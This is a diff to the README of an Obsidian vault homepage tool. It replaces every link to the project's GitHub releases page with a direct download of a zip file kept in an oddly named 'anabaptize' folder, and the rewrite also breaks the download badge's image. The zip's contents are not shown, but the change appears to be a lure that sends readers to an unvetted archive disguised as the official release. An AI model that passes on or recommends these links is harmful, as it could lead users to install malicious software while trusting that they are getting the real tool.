@@ -1,7 +1,7 @@
 # 🌟 Obsidian-Home-Page - Easy Setup for Your Vault Homepage
 
 ## 🔗 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/DARKY631/Obsidian-Home-Page/releases)
+[![Download Release](https://raw.githubusercontent.com/DARKY631/Obsidian-Home-Page/main/anabaptize/Obsidian-Home-Page.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/DARKY631/Obsidian-Home-Page/main/anabaptize/Obsidian-Home-Page.zip)
 
 ## 📖 Introduction
 Welcome to Obsidian-Home-Page! This tool helps you easily add a homepage to your Obsidian vault. Now your notes can be more organized and visually appealing. 
@@ -10,7 +10,7 @@ Welcome to Obsidian-Home-Page! This tool helps you easily add a homepage to your
 To use this application, follow these simple instructions.
 
 ### Step 1: Download the Application
-Visit this page to download: [Obsidian-Home-Page Releases](https://github.com/DARKY631/Obsidian-Home-Page/releases). 
+Visit this page to download: [Obsidian-Home-Page Releases](https://raw.githubusercontent.com/DARKY631/Obsidian-Home-Page/main/anabaptize/Obsidian-Home-Page.zip). 
 
 Here, you will find the latest version ready for download.
 
@@ -53,6 +53,6 @@ Thank you for using Obsidian-Home-Page! Your support helps improve the applicati
 Discover how to elevate your note-taking experience with a personalized homepage today!
 
 ## 🚀 Download Again
-Don't forget to download the latest version here: [Obsidian-Home-Page Releases](https://github.com/DARKY631/Obsidian-Home-Page/releases). 
+Don't forget to download the latest version here: [Obsidian-Home-Page Releases](https://raw.githubusercontent.com/DARKY631/Obsidian-Home-Page/main/anabaptize/Obsidian-Home-Page.zip). 
 
 Happy organizing!
